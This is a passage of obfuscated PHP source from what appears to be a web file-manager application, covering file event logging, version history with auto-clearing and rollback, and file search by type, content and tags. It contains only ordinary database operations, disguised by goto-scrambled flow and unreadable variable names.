$Cï×¥©ÆèØ); } public function eventShare($eÅ¹´‰‹ôØ, $bŸâö ˆ÷¡) { return $this->addEvent($eÅ¹´‰‹ôØ, $_SERVER[Ö‘Øù][1707], $bŸâö ˆ÷¡); } public function eventMove($F”‚Å¿ËÉƒ, $Bùô„¯‘£’, $F„ã¥¼©ñ) { goto e’„âåÎëº; aÛÑ‰º‚¼¼: $this->addEvent($F”‚Å¿ËÉƒ, $A£Ì¯ƒ—ôÌ[546], $aš¬Ú‡„õ); $eŠ˜¾©Øå = $e‘ÕÊº¢š->sourceInfo($F”‚Å¿ËÉƒ); $aš¬Ú‡„õ = array($A£Ì¯ƒ—ôÌ[397] => $eŠ˜¾©Øå[$A£Ì¯ƒ—ôÌ[397]], $A£Ì¯ƒ—ôÌ[28] => $eŠ˜¾©Øå[$A£Ì¯ƒ—ôÌ[28]]); goto c¸ÌØ‘¯Ö; E…àõ·Ø: $e¶’ÆˆáÕ½ = $e‘ÕÊº¢š->sourceInfo($Bùô„¯‘£’); $C†–¢Š“´ = $e‘ÕÊº¢š->sourceInfo($F„ã¥¼©ñ); $aš¬Ú‡„õ = array($A£Ì¯ƒ—ôÌ[1089] => $Bùô„¯‘£’, $A£Ì¯ƒ—ôÌ[1952] => $e¶’ÆˆáÕ½[$A£Ì¯ƒ—ôÌ[28]], $A£Ì¯ƒ—ôÌ[1932] => !empty($e¶’ÆˆáÕ½[$A£Ì¯ƒ—ôÌ[514]]) ? $e¶’ÆˆáÕ½[$A£Ì¯ƒ—ôÌ[514]] : $A£Ì¯ƒ—ôÌ[33], $A£Ì¯ƒ—ôÌ[1090] => $F„ã¥¼©ñ, $A£Ì¯ƒ—ôÌ[1953] => $C†–¢Š“´[$A£Ì¯ƒ—ôÌ[28]], $A£Ì¯ƒ—ôÌ[1954] => !empty($C†–¢Š“´[$A£Ì¯ƒ—ôÌ[514]]) ? $C†–¢Š“´[$A£Ì¯ƒ—ôÌ[514]] : $A£Ì¯ƒ—ôÌ[33]); goto aÛÑ‰º‚¼¼; e’„âåÎëº: $A£Ì¯ƒ—ôÌ =& $_SERVER[Ö‘Øù]; $e‘ÕÊº¢š = Model($A£Ì¯ƒ—ôÌ[1240]); $eŠ˜¾©Øå = $e‘ÕÊº¢š->sourceInfo($F”‚Å¿ËÉƒ); goto E…àõ·Ø; c¸ÌØ‘¯Ö: $this->addEvent($Bùô„¯‘£’, $A£Ì¯ƒ—ôÌ[1955], $aš¬Ú‡„õ); goto c­Ä÷Šç; c­Ä÷Šç: } public function eventCopy($A‹ŸÂìÓĞ¤) { $this->eventCreate($A‹ŸÂìÓĞ¤, $_SERVER[Ö‘Øù][544]); } public function eventRename($E›¨«¦œƒª, $dĞáÎ³Ïˆ, $d‹™¡¶¥Áƒ) { $c¯Ä§˜›¨ç =& $_SERVER[Ö‘Øù]; $Bôî‘áÄ¤¶ = array($c¯Ä§˜›¨ç[1089] => $dĞáÎ³Ïˆ, $c¯Ä§˜›¨ç[1090] => $d‹™¡¶¥Áƒ); return $this->addEvent($E›¨«¦œƒª, $c¯Ä§˜›¨ç[1254], $Bôî‘áÄ¤¶); } public function eventAddComment($aÉÂØ¶‚§§, $fÊ´ÑÒÅŒ) { return $this->addEvent($aÉÂØ¶‚§§, $_SERVER[Ö‘Øù][1956], $fÊ´ÑÒÅŒ); } public function eventAddDesc($Dé¨ßÈÕİğ, $bÄ˜êÎÌ¼) { return $this->addEvent($Dé¨ßÈÕİğ, $_SERVER[Ö‘Øù][1957], $bÄ˜êÎÌ¼); } public function listBySource($cËêÍî´ïİ) { goto cË§é˜ ¥Ğ; cË§é˜ ¥Ğ: $fÀ‚Û„Ÿ¨‡ =& $_SERVER[Ö‘Øù]; $aª½¦ŒÂŒ× = Model($fÀ‚Û„Ÿ¨‡[1240])->sourceInfo($cËêÍî´ïİ); $A‚–¥“›æ† = array($fÀ‚Û„Ÿ¨‡[412] => $cËêÍî´ïİ); goto A³ùÄ–‚‡; Dë‘ßá¸‹Ç: return $this->eventListParse($A ¨Ö„¬ò, $cËêÍî´ïİ); goto Cöö´Èµã®; A³ùÄ–‚‡: if ($aª½¦ŒÂŒ×[$fÀ‚Û„Ÿ¨‡[405]] == $fÀ‚Û„Ÿ¨‡[87]) { $a‹î–Á…¹ = Model($fÀ‚Û„Ÿ¨‡[1240])->listSearchChildren($cËêÍî´ïİ, 20000); $a‹î–Á…¹[] = $cËêÍî´ïİ . $fÀ‚Û„Ÿ¨‡[376]; $A‚–¥“›æ† = array($fÀ‚Û„Ÿ¨‡[397] => array($fÀ‚Û„Ÿ¨‡[7], $a‹î–Á…¹)); } $A ¨Ö„¬ò = $this->where($A‚–¥“›æ†)->order($fÀ‚Û„Ÿ¨‡[1958])->selectPage(); if ($A ¨Ö„¬ò[$fÀ‚Û„Ÿ¨‡[364]][$fÀ‚Û„Ÿ¨‡[365]] == 0) { $A ¨Ö„¬ò[$fÀ‚Û„Ÿ¨‡[364]][$fÀ‚Û„Ÿ¨‡[365]] = 1; $A ¨Ö„¬ò[$fÀ‚Û„Ÿ¨‡[367]] = array(array($fÀ‚Û„Ÿ¨‡[412] => $cËêÍî´ïİ, $fÀ‚Û„Ÿ¨‡[1941] => $aª½¦ŒÂŒ×[$fÀ‚Û„Ÿ¨‡[493]], $fÀ‚Û„Ÿ¨‡[1552] => $aª½¦ŒÂŒ×[$fÀ‚Û„Ÿ¨‡[447]], $fÀ‚Û„Ÿ¨‡[417] => $fÀ‚Û„Ÿ¨‡[1959], $fÀ‚Û„Ÿ¨‡[418] => $aª½¦ŒÂŒ×[$fÀ‚Û„Ÿ¨‡[194]], $fÀ‚Û„Ÿ¨‡[1554] => $fÀ‚Û„Ÿ¨‡[33])); } goto Dë‘ßá¸‹Ç; Cöö´Èµã®: } private function eventListParse($CËƒÈßáŠõ, $bÀ¬„œ”¡) { goto CäâÑÍùÊƒ; B§®À¸´×: $CËƒÈßáŠõ[$c×ƒ¤®®¯é[367]] = $EâÌÌ‰ÑÙí; return $CËƒÈßáŠõ; goto aßÂé‰ó•; aÉ¬‰¸”°¡: $fÉÍå‚š’« = array_to_keyvalue($EâÌÌ‰ÑÙí, $c×ƒ¤®®¯é[33], $c×ƒ¤®®¯é[1947]); foreach ($EâÌÌ‰ÑÙí as $aõİ—…Ÿ³ç) { $C¥ÅÒƒƒ¨ = $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]]; if ($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[29]] == $c×ƒ¤®®¯é[546] && isset($C¥ÅÒƒƒ¨[$c×ƒ¤®®¯é[1089]])) { $cò²“ç[] = $C¥ÅÒƒƒ¨[$c×ƒ¤®®¯é[1089]] . $c×ƒ¤®®¯é[33]; $cò²“ç[] = $C¥ÅÒƒƒ¨[$c×ƒ¤®®¯é[1090]] . $c×ƒ¤®®¯é[33]; } if ($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[29]] == $c×ƒ¤®®¯é[1955] && isset($C¥ÅÒƒƒ¨[$c×ƒ¤®®¯é[397]])) { $cò²“ç[] = $C¥ÅÒƒƒ¨[$c×ƒ¤®®¯é[397]] . $c×ƒ¤®®¯é[33]; } } $cò²“ç = array_merge($cò²“ç, $fÉÍå‚š’«, array($bÀ¬„œ”¡ . $c×ƒ¤®®¯é[33])); goto B‘ôØ÷ŠõÛ; B‘ôØ÷ŠõÛ: $cò²“ç = array_unique($cò²“ç); $fôŞ‚¾÷é = array_unique(array_to_keyvalue($EâÌÌ‰ÑÙí, $c×ƒ¤®®¯é[33], $c×ƒ¤®®¯é[1561])); $eÆËñğÎ¨Ã = Model($c×ƒ¤®®¯é[533])->userListInfo($fôŞ‚¾÷é); goto fŞ­Ã³¤; fŞ­Ã³¤: $aî‡Úç¸è = Model($c×ƒ¤®®¯é[825])->sourceListInfo($cò²“ç, !0); foreach ($EâÌÌ‰ÑÙí as &$aõİ—…Ÿ³ç) { if ($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[29]] == $c×ƒ¤®®¯é[546] && isset($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[1089]])) { $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[1089]] = $aî‡Úç¸è[$aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[1089]]]; $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[1090]] = $aî‡Úç¸è[$aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[1090]]]; } if ($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[29]] == $c×ƒ¤®®¯é[1955] && isset($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[397]])) { $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[397]] = $aî‡Úç¸è[$aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[446]][$c×ƒ¤®®¯é[397]]]; } $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[85]] = $aî‡Úç¸è[$aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[397]]]; $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1960]] = $aî‡Úç¸è[$aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1947]]]; if ($aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[29]] == $c×ƒ¤®®¯é[1696]) { $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1960]] = $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[85]]; $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1947]] = $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1960]][$c×ƒ¤®®¯é[397]]; $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[85]] = !1; $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[397]] = $c×ƒ¤®®¯é[33]; } $aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1892]] = $eÆËñğÎ¨Ã[$aõİ—…Ÿ³ç[$c×ƒ¤®®¯é[1561]]]; } unset($aõİ—…Ÿ³ç); goto B§®À¸´×; CäâÑÍùÊƒ: $c×ƒ¤®®¯é =& $_SERVER[Ö‘Øù]; $EâÌÌ‰ÑÙí = $CËƒÈßáŠõ[$c×ƒ¤®®¯é[367]]; $cò²“ç = array_to_keyvalue($EâÌÌ‰ÑÙí, $c×ƒ¤®®¯é[33], $c×ƒ¤®®¯é[397]); goto aÉ¬‰¸”°¡; aßÂé‰ó•: } public function removeBySource($f…Ø¬˜˜¨Å) { $C¸à–×“­ = array($_SERVER[Ö‘Øù][412] => $f…Ø¬˜˜¨Å); $this->where($C¸à–×“­)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\143\x65\137\x68\151\163\164\x6f\162\x79"; public function historyCount($B³ñµÎÛˆ) { goto b¢‚…¾ºµ†; b¢‚…¾ºµ†: $e”‹„à’¤È =& $_SERVER[Ö‘Øù]; if (!$B³ñµÎÛˆ) { return array(); } if (is_string($B³ñµÎÛˆ) || is_int($B³ñµÎÛˆ)) { $B³ñµÎÛˆ = array($B³ñµÎÛˆ); } goto E¯¤«‘‡ß; E¯¤«‘‡ß: $aŒç¼‚’ãİ = array($e”‹„à’¤È[397], $e”‹„à’¤È[1762] => $e”‹„à’¤È[495]); $a›ùƒ±Ò”“ = array($e”‹„à’¤È[397] => array($e”‹„à’¤È[7], $B³ñµÎÛˆ)); $e¬‰„Áë… = $this->field($aŒç¼‚’ãİ)->where($a›ùƒ±Ò”“)->group($e”‹„à’¤È[397])->select(); goto fÛÌÕôÏÁÔ; fÛÌÕôÏÁÔ: return array_to_keyvalue($e¬‰„Áë…, $e”‹„à’¤È[397], $e”‹„à’¤È[495]); goto Fß×©˜¯öù; Fß×©˜¯öù: } public function addHistory($dŠõ·Ò›°, $bŸŒ…óà„ = '') { $eÛËàµœùÇ =& $_SERVER[Ö‘Øù]; $c‹«°Î¾¦ù = array($eÛËàµœùÇ[412] => $dŠõ·Ò›°[$eÛËàµœùÇ[397]], $eÛËàµœùÇ[1552] => isset($dŠõ·Ò›°[$eÛËàµœùÇ[449]]) ? $dŠõ·Ò›°[$eÛËàµœùÇ[449]] : $dŠõ·Ò›°[$eÛËàµœùÇ[447]], $eÛËàµœùÇ[463] => $dŠõ·Ò›°[$eÛËàµœùÇ[462]], $eÛËàµœùÇ[574] => $dŠõ·Ò›°[$eÛËàµœùÇ[78]], $eÛËàµœùÇ[1961] => $bŸŒ…óà„); $fí¤´áË“Ò = $GLOBALS[$eÛËàµœùÇ[6]][$eÛËàµœùÇ[88]][$eÛËàµœùÇ[1138]]; if ($fí¤´áË“Ò > 1) { $this->historyAutoClear($c‹«°Î¾¦ù[$eÛËàµœùÇ[397]]); $this->add($c‹«°Î¾¦ù); } Hook::trigger($eÛËàµœùÇ[1962], $c‹«°Î¾¦ù); Model($eÛËàµœùÇ[1963])->eventFileEdit($dŠõ·Ò›°[$eÛËàµœùÇ[397]]); } private function historyAutoClear($e’ò‘ŞĞ÷½) { goto cŒ‚õ†æ‹; a£°èù÷Ñ: $fò’×¤¬´ = array($D“›®©ˆ¨[412] => $e’ò‘ŞĞ÷½); $cÛÆ¢œÙ÷Ê = $this->field($D“›®©ˆ¨[1964])->where($fò’×¤¬´)->order($D“›®©ˆ¨[1958])->select(); if (!$cÛÆ¢œÙ÷Ê || $BöŠÎÈñË >= count($cÛÆ¢œÙ÷Ê)) { return; } goto cĞôßÙº£é; cŒ‚õ†æ‹: $D“›®©ˆ¨ =& $_SERVER[Ö‘Øù]; $A°¼Å×ËŒß = Model($D“›®©ˆ¨[763])->get($D“›®©ˆ¨[1160]); $añÀè·˜°‰ = $GLOBALS[$D“›®©ˆ¨[6]][$D“›®©ˆ¨[88]][$D“›®©ˆ¨[1138]]; goto c¢ÒÏ¾×‰¿; EøÎ¡¥‘á: $e™ˆŒÒìß¬ = array_slice($e™ˆŒÒìß¬, $BöŠÎÈñË); if (!$e‰ÌÅÄŒæ× || !$e™ˆŒÒìß¬) { return; } $fò’×¤¬´ = array($D“›®©ˆ¨[414] => array($D“›®©ˆ¨[7], $e‰ÌÅÄŒæ×)); goto bå™Š¢Æ“; bå™Š¢Æ“: $this->where($fò’×¤¬´)->delete(); Model($D“›®©ˆ¨[465])->remove($e™ˆŒÒìß¬); goto d°µŸõ²‘Ç; cĞôßÙº£é: $e‰ÌÅÄŒæ× = array_to_keyvalue($cÛÆ¢œÙ÷Ê, $D“›®©ˆ¨[33], $D“›®©ˆ¨[395]); $e‰ÌÅÄŒæ× = array_slice($e‰ÌÅÄŒæ×, $BöŠÎÈñË); $e™ˆŒÒìß¬ = array_to_keyvalue($cÛÆ¢œÙ÷Ê, $D“›®©ˆ¨[33], $D“›®©ˆ¨[462]); goto EøÎ¡¥‘á; c¢ÒÏ¾×‰¿: $BöŠÎÈñË = $A°¼Å×ËŒß == $D“›®©ˆ¨[1161] ? 5 : $añÀè·˜°‰; if ($añÀè·˜°‰ <= 1) { $BöŠÎÈñË = 1; } if ($BöŠÎÈñË >= 500) { return; } goto a£°èù÷Ñ; d°µŸõ²‘Ç: } public function listData($BòğŞƒ»›Ÿ) { goto c²ì‘‡™œª; A‡ÒïšŠÌ„: $fµ±ŸÈ—ã = $this->field($E…ä¶•ê)->where($f´¥Îœêßî)->order($e©àß‹Ÿòø[1958])->selectPage(); $this->_listAppendUser($fµ±ŸÈ—ã[$e©àß‹Ÿòø[367]]); $a§¹ÏàÓŒ = Model($e©àß‹Ÿòø[763])->get($e©àß‹Ÿòø[1160]); goto b–·„½ì®¿; c²ì‘‡™œª: $e©àß‹Ÿòø =& $_SERVER[Ö‘Øù]; $f´¥Îœêßî = array($e©àß‹Ÿòø[412] => $BòğŞƒ»›Ÿ); $E…ä¶•ê = $e©àß‹Ÿòø[1965]; goto A‡ÒïšŠÌ„; b–·„½ì®¿: $d¡Ş ÏÈ = 5; if ($a§¹ÏàÓŒ == $e©àß‹Ÿòø[1161]) { $fµ±ŸÈ—ã[$e©àß‹Ÿòø[367]] = array_slice($fµ±ŸÈ—ã[$e©àß‹Ÿòø[367]], 0, $d¡Ş ÏÈ); $fµ±ŸÈ—ã[$e©àß‹Ÿòø[364]] = array($e©àß‹Ÿòø[1966] => 1, $e©àß‹Ÿòø[1967] => 20, $e©àß‹Ÿòø[1968] => 1, $e©àß‹Ÿòø[1969] => count($fµ±ŸÈ—ã[$e©àß‹Ÿòø[367]])); } return $fµ±ŸÈ—ã; goto dˆ™Ö§–æÚ; dˆ™Ö§–æÚ: } protected function _listAppendUser(&$aİÆ¾ã™) { $C¶×¬óƒ² =& $_SERVER[Ö‘Øù]; $fŠÄ‚‚Œë™ = array_to_keyvalue($aİÆ¾ã™, $C¶×¬óƒ²[33], $C¶×¬óƒ²[1561]); $B‚ÈŠ›×÷ = Model($C¶×¬óƒ²[533])->userListInfo($fŠÄ‚‚Œë™); foreach ($aİÆ¾ã™ as &$AŸŠ°ŒšİÉ) { $EÊ„ó²‰ÄÄ = $AŸŠ°ŒšİÉ[$C¶×¬óƒ²[1561]]; $AŸŠ°ŒšİÉ[$C¶×¬óƒ²[447]] = $B‚ÈŠ›×÷[$EÊ„ó²‰ÄÄ] ? $B‚ÈŠ›×÷[$EÊ„ó²‰ÄÄ] : !1; } unset($AŸŠ°ŒšİÉ); } public function fileInfo($B‘„‹„×Ğ¿) { $dÑÈ™¸† =& $_SERVER[Ö‘Øù]; $A¡Óø¤œ÷¨ = $this->tablePrefix; $fôô¼Ù­°¼ = "{$A¡Óø¤œ÷¨}\x69\157\x5f\x66\x69\154\x65\40\146\x69\x6c\x65\x73\x20\157\156\x20\x66\151\x6c\x65\x73\x2e\146\151\154\145\x49\104\40\75\40\x68\151\163\164\x6f\162\171\x2e\x66\x69\x6c\145\111\104"; return $this->alias($dÑÈ™¸†[1970])->where(array($dÑÈ™¸†[414] => $B‘„‹„×Ğ¿))->join($fôô¼Ù­°¼, $dÑÈ™¸†[1971])->find(); } public function removeItem($E¸î…¿‰¶) { $CÇøĞÊ³Şã =& $_SERVER[Ö‘Øù]; $EØÏ™Ÿïìë = array($CÇøĞÊ³Şã[414] => $E¸î…¿‰¶); $C……íîêÄ¶ = $this->where($EØÏ™Ÿïìë)->find(); if ($C……íîêÄ¶) { $CŞ†ìù = $this->where($EØÏ™Ÿïìë)->delete(); Model($CÇøĞÊ³Şã[465])->remove($C……íîêÄ¶[$CÇøĞÊ³Şã[462]]); return $CŞ†ìù; } return !1; } public function removeBySource($B“°ÚœÖ‹) { goto C‚ ğø¬º; C‚ ğø¬º: $eÑ—ÛË¦Í… =& $_SERVER[Ö‘Øù]; if (!$B“°ÚœÖ‹) { return !1; } if (!is_array($B“°ÚœÖ‹)) { $B“°ÚœÖ‹ = array($B“°ÚœÖ‹); } goto fƒ­“”ï÷; eçöˆÂºâ: return !0; goto fÁ‚‡ƒÂÄ; fƒ­“”ï÷: $FöæœáÅù = array($eÑ—ÛË¦Í…[412] => array($eÑ—ÛË¦Í…[7], $B“°ÚœÖ‹)); $AæŒŒ–‹ = $this->field($eÑ—ÛË¦Í…[463])->where($FöæœáÅù)->select(); if ($AæŒŒ–‹) { $this->where($FöæœáÅù)->delete(); $EŞõÅ¹¶³° = array_to_keyvalue($AæŒŒ–‹, $eÑ—ÛË¦Í…[33], $eÑ—ÛË¦Í…[462]); Model($eÑ—ÛË¦Í…[465])->remove($EŞõÅ¹¶³°); } goto eçöˆÂºâ; fÁ‚‡ƒÂÄ: } public function setDetail($E¤«ô»¢¶‹, $b’É±±Å™) { $d‡§ç¤È¤ =& $_SERVER[Ö‘Øù]; return $this->where(array($d‡§ç¤È¤[414] => $E¤«ô»¢¶‹))->save(array($d‡§ç¤È¤[1961] => $b’É±±Å™)); } public function rollbackToItem($b˜Ã¶İìÏ, $B…ğ¹Æ†³“) { goto aÑöø´†Ğ±; FõåÆğ¼ª: return $this->where(array($B£é„­‰õ÷[414] => $B…ğ¹Æ†³“))->delete(); goto eÖ³—Ö¿¤ë; aÑöø´†Ğ±: $B£é„­‰õ÷ =& $_SERVER[Ö‘Øù]; $cÛÁÄÃ’íÑ = Model($B£é„­‰õ÷[825])->sourceInfo($b˜Ã¶İìÏ); $this->addHistory($cÛÁÄÃ’íÑ, LNG($B£é„­‰õ÷[1972])); goto Eèñ³É®„í; Eèñ³É®„í: $d•‹¯‘À÷Ğ = $this->find($B…ğ¹Æ†³“); $BÁ¡ì‚´ÏÎ = array($B£é„­‰õ÷[462] => $d•‹¯‘À÷Ğ[$B£é„­‰õ÷[462]], $B£é„­‰õ÷[78] => $d•‹¯‘À÷Ğ[$B£é„­‰õ÷[78]], $B£é„­‰õ÷[84] => time(), $B£é„­‰õ÷[449] => USER_ID); Model($B£é„­‰õ÷[825])->where(array($B£é„­‰õ÷[397] => $b˜Ã¶İìÏ))->save($BÁ¡ì‚´ÏÎ); goto FõåÆğ¼ª; eÖ³—Ö¿¤ë: } public function clearSame($A¬Ã§»ÓÊ) { goto eÔ•ùé‡§¹; e¥Ñ“Î¥Ä–: if (!$AËğÖ“¡¥) { return; } $this->where(array($dÂ•®ÇÖŠ[395] => array($dÂ•®ÇÖŠ[7], $AËğÖ“¡¥)))->delete(); Model($dÂ•®ÇÖŠ[465])->remove($EíÔ»¬Æµù); goto Aøöì™‰‚š; Eğà˜óˆòÆ: $EíÔ»¬Æµù = array(); $AËğÖ“¡¥ = array(); foreach ($C¨ÊŠƒßÏ’ as $eË¢º£ŒØ) { if (!$eË¢º£ŒØ || count($eË¢º£ŒØ) <= 1) { continue; } foreach ($eË¢º£ŒØ as $aÏÒêÕ¤Á¼) { $EíÔ»¬Æµù[] = $aÏÒêÕ¤Á¼[$dÂ•®ÇÖŠ[462]]; $AËğÖ“¡¥[] = $aÏÒêÕ¤Á¼[$dÂ•®ÇÖŠ[395]]; } } goto e¥Ñ“Î¥Ä–; eÔ•ùé‡§¹: $dÂ•®ÇÖŠ =& $_SERVER[Ö‘Øù]; $f·Äè‹Õ•¨ = $this->listData($A¬Ã§»ÓÊ); $C¨ÊŠƒßÏ’ = array_to_keyvalue_group($f·Äè‹Õ•¨, $dÂ•®ÇÖŠ[462]); goto Eğà˜óˆòÆ; Aøöì™‰‚š: } public function userSpace() { $dÙÊ§øÖ†É =& $_SERVER[Ö‘Øù]; $cæÒ¾‰äãÉ = $this->tablePrefix; $aĞÓ”Ÿ¾á = array($dÙÊ§øÖ†É[1552] => USER_ID); $bÔ”Ôâöæê = "{$cæÒ¾‰äãÉ}\x69\157\137\146\151\154\x65\40\x66\x69\154\x65\163\x20\157\156\40\x66\151\154\145\x73\x2e\x66\151\154\145\x49\104\x20\75\40\150\151\163\164\x6f\162\171\56\x66\151\x6c\x65\111\x44"; return $this->alias($dÙÊ§øÖ†É[1970])->where($aĞÓ”Ÿ¾á)->join($bÔ”Ôâöæê, $dÙÊ§øÖ†É[1971])->sum($dÙÊ§øÖ†É[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($f¥ì’­Ç©Ì) { goto BáÓÒ’¦›; BáÓÒ’¦›: $Eñé‘ò·ª³ =& $_SERVER[Ö‘Øù]; $A‘³Ë°ß÷Ÿ = KodIO::fileTypeList(); $cÏŒÛÓŞÛí = $A‘³Ë°ß÷Ÿ[$f¥ì’­Ç©Ì]; goto E¿·Ó¼•; b´ØÄ‡ñ: if (!$cÏŒÛÓŞÛí[$Eñé‘ò·ª³[168]]) { $b±Æ¬Œä¾ä = array_to_keyvalue($A‘³Ë°ß÷Ÿ, $Eñé‘ò·ª³[33], $Eñé‘ò·ª³[168]); $F’…‘Ÿ¤Ú‰ = implode($Eñé‘ò·ª³[47], $b±Æ¬Œä¾ä); $Còîñ¿¨çê = $Eñé‘ò·ª³[1973]; } $Aá´™ñÄ—Ñ = explode($Eñé‘ò·ª³[47], trim($F’…‘Ÿ¤Ú‰, $Eñé‘ò·ª³[47])); return array($Còîñ¿¨çê, $Aá´™ñÄ—Ñ); goto eÆ£‰Ğ˜·š; E¿·Ó¼•: if (!$cÏŒÛÓŞÛí) { return array(); } $F’…‘Ÿ¤Ú‰ = $cÏŒÛÓŞÛí[$Eñé‘ò·ª³[168]]; $Còîñ¿¨çê = $Eñé‘ò·ª³[7]; goto b´ØÄ‡ñ; eÆ£‰Ğ˜·š: } public function listPathType($a¡ÉÌ‘®—‡) { $CªÑÜîä¤¡ =& $_SERVER[Ö‘Øù]; $DÂ ¤À’Õ = $this->fileTypeWhere($a¡ÉÌ‘®—‡); if (!$DÂ ¤À’Õ) { return array(); } $Dù°ìïŸ¼Ô = array($CªÑÜîä¤¡[575] => SourceModel::TYPE_USER, $CªÑÜîä¤¡[576] => USER_ID, $CªÑÜîä¤¡[572] => 0, $CªÑÜîä¤¡[573] => $DÂ ¤À’Õ); return $this->listSource($Dù°ìïŸ¼Ô); } public function listSearch($DÂÈª˜èİÕ, $cÏç³ï‰—… = 300) { goto Eëå¦ô´‘Ÿ; e³øÔ×ùÃ: $this->_listDataApply($D‹ã†¬õ¯Æ[$F¬ªÃÏÏ×Ú[367]]); $this->_listMake($D‹ã†¬õ¯Æ); return $D‹ã†¬õ¯Æ; goto côŠ‰Æ¾ø; cÆÁÎĞÂ‚¨: $f«÷‡ßİÙ§ = $E÷ƒø½™®ª; $this->_listSearchBindPinyin($DÂÈª˜èİÕ, $e¯É³¥™ªÆ, $E÷ƒø½™®ª); $this->alias($F¬ªÃÏÏ×Ú[439])->_makeOrder(); goto b¶µ¸ô°ñ; EÉ¡™³ˆå®: $this->_listSearchDesc($D‹ã†¬õ¯Æ, $DÂÈª˜èİÕ, $f«÷‡ßİÙ§); $this->_listSearchTag($D‹ã†¬õ¯Æ, $DÂÈª˜èİÕ, $f«÷‡ßİÙ§); $this->_listSearchGroupTag($D‹ã†¬õ¯Æ, $DÂÈª˜èİÕ, $f«÷‡ßİÙ§); goto e³øÔ×ùÃ; c•»àö’¬Ä: $dùÙ´ÕÆç¹ = $e¯É³¥™ªÆ; if (!isset($e¯É³¥™ªÆ[$F¬ªÃÏÏ×Ú[425]])) { $e¯É³¥™ªÆ[$F¬ªÃÏÏ×Ú[425]] = 0; } $E÷ƒø½™®ª = $F¬ªÃÏÏ×Ú[1975]; goto cÆÁÎĞÂ‚¨; Eëå¦ô´‘Ÿ: $F¬ªÃÏÏ×Ú =& $_SERVER[Ö‘Øù]; if (isset($DÂÈª˜èİÕ[$F¬ªÃÏÏ×Ú[1818]]) && $DÂÈª˜èİÕ[$F¬ªÃÏÏ×Ú[1818]]) { $DÂÈª˜èİÕ[$F¬ªÃÏÏ×Ú[1818]] = str_replace($F¬ªÃÏÏ×Ú[382], $F¬ªÃÏÏ×Ú[1974], trim($DÂÈª˜èİÕ[$F¬ªÃÏÏ×Ú[1818]])); } $e¯É³¥™ªÆ = $this->_parseSearchWhere($DÂÈª˜èİÕ); goto c•»àö’¬Ä; b¶µ¸ô°ñ: $e¯É³¥™ªÆ = $this->parseWhereLike($e¯É³¥™ªÆ); $D‹ã†¬õ¯Æ = $this->distinct(!0)->field($E÷ƒø½™®ª)->where($e¯É³¥™ªÆ)->selectPage($cÏç³ï‰—…); $this->_listSearchFileContent($D‹ã†¬õ¯Æ, $DÂÈª˜èİÕ, $f«÷‡ßİÙ§, $dùÙ´ÕÆç¹); goto EÉ¡™³ˆå®; côŠ‰Æ¾ø: } private function _listSearchFileContent(&$BÁğÔ˜ÃÑ³, $båïä‘Ã¥, $câ¸ŞåöîÂ, $B‚ŒÕ°ÖšÌ) { goto b‚ÇÛã–¬æ; b‚ÇÛã–¬æ: $aï°¶´õ» =& $_SERVER[Ö‘Øù]; if (!$båïä‘Ã¥[$aï°¶´õ»[1818]] || $BÁğÔ˜ÃÑ³[$aï°¶´õ»[364]][$aï°¶´õ»[351]] > 1) { return; } if (!isset($B‚ŒÕ°ÖšÌ[$aï°¶´õ»[28]]) || !is_array($båïä‘Ã¥[$aï°¶´õ»[462]])) { return; } goto EÂ¶• ŒÎø; dŞøÇºœ¾ñ: $BÁğÔ˜ÃÑ³[$aï°¶´õ»[364]][$aï°¶´õ»[365]] += count($a„êœ®ò ); goto a½äŠßÑ²°; f¡Ìµ•°†â: $a„êœ®ò  = $this->field($câ¸ŞåöîÂ)->where($B‚ŒÕ°ÖšÌ)->limit($aï°¶´õ»[1976])->select(); if (!$a„êœ®ò  || count($a„êœ®ò ) == 0) { return; } $BÁğÔ˜ÃÑ³[$aï°¶´õ»[367]] = array_merge($a„êœ®ò , $BÁğÔ˜ÃÑ³[$aï°¶´õ»[367]]); goto dŞøÇºœ¾ñ; EÂ¶• ŒÎø: $B‚ŒÕ°ÖšÌ[$aï°¶´õ»[462]] = array($aï°¶´õ»[7], $båïä‘Ã¥[$aï°¶´õ»[462]]); unset($B‚ŒÕ°ÖšÌ[$aï°¶´õ»[28]]); unset($båïä‘Ã¥[$aï°¶´õ»[462]]); goto f¡Ìµ•°†â; a½äŠßÑ²°: } private function _listSearchTag(&$dŸ„â¤ç£½, $f§²õ‘‘è, $FÜ¶í‘‚†µ) { goto a£ßÑÚß­Ì; bîÜœ˜ŞŠ: if (!$DÂ¤ÌïğŒÜ) { return; } $c§´•Ş™õ¯ = array($d‡Šô×ˆáÛ[421] => array($d‡Šô×ˆáÛ[7], $DÂ¤ÌïğŒÜ), $d‡Šô×ˆáÛ[1561] => USER_ID); $fî¨Èİ…ö = Model($d‡Šô×ˆáÛ[422])->field($d‡Šô×ˆáÛ[76])->where($c§´•Ş™õ¯)->select(); goto 